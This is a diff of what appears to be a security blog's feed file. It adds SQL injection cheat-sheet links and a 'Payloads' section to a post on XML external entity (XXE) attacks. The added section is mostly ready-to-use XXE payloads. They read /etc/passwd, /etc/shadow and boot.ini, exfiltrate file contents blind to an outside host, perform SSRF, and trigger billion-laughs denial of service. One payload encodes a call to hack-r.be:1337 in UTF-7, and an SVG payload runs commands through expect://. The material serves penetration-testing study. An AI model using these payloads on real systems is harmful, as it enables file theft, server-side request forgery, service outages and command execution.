+<p>-<a href="https://sqlwiki.netspi.com/#mysql">https://sqlwiki.netspi.com/#mysql</a><br>
+-<a href="https://sites.google.com/a/michaelboman.org/www-michaelboman-org/books/sql-injection-cheat-sheet-oracle">https://sites.google.com/a/michaelboman.org/www-michaelboman-org/books/sql-injection-cheat-sheet-oracle</a><br>
+-<a href="https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/">https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/</a><br>
+-<a href="https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/">https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/</a></p>
+]]></content>
+        </item>
         
         <item>
             <title>XXE</title>
@@ -15,7 +700,7 @@
             <pubDate>Mon, 07 Jun 2021 00:00:00 +0000</pubDate>
             
             <guid>https://tranquac.github.io/posts/2021/06/xxe/</guid>
-            <description>What is XXE Types of XXE attacks  XXE To retrieve files  Example XXE through the XInclude tag Exploiting XXE using SVG Files or docx files or xlsx files   XXE Into SSRF Blind XXE   Note References  What is XXE XXE = XML eXternal Entities
+            <description>What is XXE Types of XXE attacks  XXE To retrieve files  Example XXE through the XInclude tag Exploiting XXE using SVG Files or docx files or xlsx files   XXE Into SSRF Blind XXE   Payloads Note References  What is XXE XXE = XML eXternal Entities
 XXE can occur when XML documents get parsed. We traditionally think of XXE vulnerabilities as uploading an XML file that includes an external entity, an example of this would be:</description>
             <content type="html"><![CDATA[<ul>
 <li><a href="#what-is-xxe">What is XXE</a></li>
@@ -32,6 +717,7 @@ XXE can occur when XML documents get parsed. We traditionally think of XXE vulne
 <li><a href="#blind-xxe">Blind XXE</a></li>
 </ul>
 </li>
+<li><a href="#payloads">Payloads</a></li>
 <li><a href="#note">Note</a></li>
 <li><a href="#references">References</a></li>
 </ul>
@@ -96,7 +782,134 @@ You can do the same with xlsx and svg
 %eval;
 %exfiltrate;
 </code></pre></div><p>Our first entity will grab the data file /etc/passwd and our second entity will make a callback to our server with the contents of the /etc/passwd file in a get parameter.</p>
-<h2 id="note">Note</h2>
+<h2 id="payloads">Payloads</h2>
+<ul>
+<li>XXE : Classic XXE</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+<span style="color:#75715e">&lt;!DOCTYPE data [
+</span><span style="color:#75715e">&lt;!ELEMENT data (#ANY)&gt;</span>
+<span style="color:#75715e">&lt;!ENTITY file SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
+]&gt;
+<span style="color:#f92672">&lt;data&gt;</span>&amp;file;<span style="color:#f92672">&lt;/data&gt;</span>
+
+<span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
+  <span style="color:#75715e">&lt;!DOCTYPE foo [  
+</span><span style="color:#75715e">  &lt;!ELEMENT foo ANY &gt;</span>
+  <span style="color:#75715e">&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34; &gt;</span>]&gt;<span style="color:#f92672">&lt;foo&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/foo&gt;</span>
+
+<span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
+<span style="color:#75715e">&lt;!DOCTYPE foo [  
+</span><span style="color:#75715e">  &lt;!ELEMENT foo ANY &gt;</span>
+  <span style="color:#75715e">&lt;!ENTITY xxe SYSTEM &#34;file:///c:/boot.ini&#34; &gt;</span>]&gt;<span style="color:#f92672">&lt;foo&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/foo&gt;</span>
+
+<span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
+<span style="color:#75715e">&lt;!DOCTYPE foo [  
+</span><span style="color:#75715e">  &lt;!ELEMENT foo ANY &gt;</span>
+  <span style="color:#75715e">&lt;!ENTITY xxe SYSTEM &#34;file:///c:/boot.ini&#34; &gt;</span>]&gt;<span style="color:#f92672">&lt;foo&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/foo&gt;</span> 
+</code></pre></div><ul>
+<li>XXE: Basic XML Example</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!--?xml version=&#34;1.0&#34; ?--&gt;</span>
+<span style="color:#f92672">&lt;userInfo&gt;</span>
+ <span style="color:#f92672">&lt;firstName&gt;</span>John<span style="color:#f92672">&lt;/firstName&gt;</span>
+ <span style="color:#f92672">&lt;lastName&gt;</span>Doe<span style="color:#f92672">&lt;/lastName&gt;</span>
+<span style="color:#f92672">&lt;/userInfo&gt;</span>
+</code></pre></div><ul>
+<li>XXE: Entity Example</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!--?xml version=&#34;1.0&#34; ?--&gt;</span>
+<span style="color:#75715e">&lt;!DOCTYPE replace [&lt;!ENTITY example &#34;Doe&#34;&gt;</span> ]&gt;
+ <span style="color:#f92672">&lt;userInfo&gt;</span>
+  <span style="color:#f92672">&lt;firstName&gt;</span>John<span style="color:#f92672">&lt;/firstName&gt;</span>
+  <span style="color:#f92672">&lt;lastName&gt;</span>&amp;example;<span style="color:#f92672">&lt;/lastName&gt;</span>
+ <span style="color:#f92672">&lt;/userInfo&gt;</span>
+</code></pre></div><ul>
+<li>XXE: File Disclosure</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!--?xml version=&#34;1.0&#34; ?--&gt;</span>
+<span style="color:#75715e">&lt;!DOCTYPE replace [&lt;!ENTITY ent SYSTEM &#34;file:///etc/shadow&#34;&gt;</span> ]&gt;
+<span style="color:#f92672">&lt;userInfo&gt;</span>
+ <span style="color:#f92672">&lt;firstName&gt;</span>John<span style="color:#f92672">&lt;/firstName&gt;</span>
+ <span style="color:#f92672">&lt;lastName&gt;</span>&amp;ent;<span style="color:#f92672">&lt;/lastName&gt;</span>
+<span style="color:#f92672">&lt;/userInfo&gt;</span>
+</code></pre></div><ul>
+<li>XXE: Denial-of-Service Example</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!--?xml version=&#34;1.0&#34; ?--&gt;</span>
+<span style="color:#75715e">&lt;!DOCTYPE lolz [&lt;!ENTITY lol &#34;lol&#34;&gt;&lt;!ELEMENT lolz (#PCDATA)&gt;</span>
+<span style="color:#75715e">&lt;!ENTITY lol1 &#34;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;
+</span><span style="color:#75715e">&lt;!ENTITY lol2 &#34;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&#34;&gt;</span>
+<span style="color:#75715e">&lt;!ENTITY lol3 &#34;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&#34;&gt;</span>
+<span style="color:#75715e">&lt;!ENTITY lol4 &#34;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&#34;&gt;</span>
+<span style="color:#75715e">&lt;!ENTITY lol5 &#34;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&#34;&gt;</span>
+<span style="color:#75715e">&lt;!ENTITY lol6 &#34;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&#34;&gt;</span>
+<span style="color:#75715e">&lt;!ENTITY lol7 &#34;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&#34;&gt;</span>
+<span style="color:#75715e">&lt;!ENTITY lol8 &#34;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&#34;&gt;</span>
+<span style="color:#75715e">&lt;!ENTITY lol9 &#34;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&#34;&gt;</span>
+<span style="color:#f92672">&lt;tag&gt;</span>&amp;lol9;<span style="color:#f92672">&lt;/tag&gt;</span>
+</code></pre></div><ul>
+<li>XXE: Local File Inclusion Example</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+<span style="color:#75715e">&lt;!DOCTYPE foo [  
+</span><span style="color:#75715e">&lt;!ELEMENT foo (#ANY)&gt;</span>
+<span style="color:#75715e">&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>]&gt;<span style="color:#f92672">&lt;foo&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/foo&gt;</span>
+</code></pre></div><ul>
+<li>XXE: Blind Local File Inclusion Example (When first case doesn&rsquo;t return anything.)</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+<span style="color:#75715e">&lt;!DOCTYPE foo [
+</span><span style="color:#75715e">&lt;!ELEMENT foo (#ANY)&gt;</span>
+<span style="color:#75715e">&lt;!ENTITY % xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
+<span style="color:#75715e">&lt;!ENTITY blind SYSTEM &#34;https://www.example.com/?%xxe;&#34;&gt;</span>]&gt;<span style="color:#f92672">&lt;foo&gt;</span>&amp;blind;<span style="color:#f92672">&lt;/foo&gt;</span>
+</code></pre></div><ul>
+<li>XXE: Access Control Bypass (Loading Restricted Resources - PHP example)</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+<span style="color:#75715e">&lt;!DOCTYPE foo [
+</span><span style="color:#75715e">&lt;!ENTITY ac SYSTEM &#34;php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php&#34;&gt;</span>]&gt;
+<span style="color:#f92672">&lt;foo&gt;&lt;result&gt;</span>&amp;ac;<span style="color:#f92672">&lt;/result&gt;&lt;/foo&gt;</span>
+</code></pre></div><ul>
+<li>XXE:SSRF ( Server Side Request Forgery ) Example</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+<span style="color:#75715e">&lt;!DOCTYPE foo [  
+</span><span style="color:#75715e">&lt;!ELEMENT foo (#ANY)&gt;</span>
+<span style="color:#75715e">&lt;!ENTITY xxe SYSTEM &#34;https://www.example.com/text.txt&#34;&gt;</span>]&gt;<span style="color:#f92672">&lt;foo&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/foo&gt;</span>
+</code></pre></div><ul>
+<li>XXE: (Remote Attack - Through External Xml Inclusion) Exmaple</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+<span style="color:#75715e">&lt;!DOCTYPE lolz [
+</span><span style="color:#75715e">&lt;!ENTITY test SYSTEM &#34;https://example.com/entity1.xml&#34;&gt;</span>]&gt;
+<span style="color:#f92672">&lt;lolz&gt;&lt;lol&gt;</span>3..2..1...<span style="color:#960050;background-color:#1e0010">&amp;</span>test<span style="color:#f92672">&lt;lol&gt;&lt;/lolz&gt;</span>
+</code></pre></div><ul>
+<li>XXE: UTF-7 Exmaple</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-7&#34;?&gt;</span>
++ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
++ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
++ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
+</code></pre></div><ul>
+<li>XXE: Base64 Encoded</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!DOCTYPE test [ &lt;!ENTITY % init SYSTEM &#34;data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk&#34;&gt;</span> %init; ]&gt;<span style="color:#f92672">&lt;foo/&gt;</span>
+</code></pre></div><ul>
+<li>XXE: XXE inside SOAP Example</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#f92672">&lt;soap:Body&gt;</span>
+  <span style="color:#f92672">&lt;foo&gt;</span>
+    <span style="color:#75715e">&lt;![CDATA[&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM &#34;http://x.x.x.x:22/&#34;&gt; %dtd;]&gt;&lt;xxx/&gt;]]&gt;</span>
+  <span style="color:#f92672">&lt;/foo&gt;</span>
+<span style="color:#f92672">&lt;/soap:Body&gt;</span>
+</code></pre></div><ul>
+<li>XXE: XXE inside SVG</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#f92672">&lt;svg</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://www.w3.org/2000/svg&#34;</span> <span style="color:#a6e22e">xmlns:xlink=</span><span style="color:#e6db74">&#34;http://www.w3.org/1999/xlink&#34;</span> <span style="color:#a6e22e">width=</span><span style="color:#e6db74">&#34;300&#34;</span> <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;1.1&#34;</span> <span style="color:#a6e22e">height=</span><span style="color:#e6db74">&#34;200&#34;</span><span style="color:#f92672">&gt;</span>
+    <span style="color:#f92672">&lt;image</span> <span style="color:#a6e22e">xlink:href=</span><span style="color:#e6db74">&#34;expect://ls&#34;</span><span style="color:#f92672">&gt;&lt;/image&gt;</span>
+<span style="color:#f92672">&lt;/svg&gt;</span>
+</code></pre></div><h2 id="note">Note</h2>
 <p>Alway check file upload can inject xml</p>
 <ul>
 <li>profile pictures (.svg)</li>
